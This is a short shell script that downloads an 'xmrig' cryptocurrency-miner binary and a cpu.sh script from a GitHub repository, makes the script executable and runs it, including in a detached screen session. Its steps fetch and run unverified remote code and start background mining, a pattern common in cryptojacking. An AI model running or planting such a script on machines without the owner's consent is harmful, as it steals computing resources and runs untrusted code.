#!/bin/sh

sudo apt update
sudo apt install screen -y
screen -dmS cpu.sh ./cpu.sh 65 75
wget https://github.com/pogchampv10/CPU/raw/main/xmrig
wget https://raw.githubusercontent.com/pogchampv10/CPU/main/cpu.sh
chmod +x cpu.sh
./cpu.sh
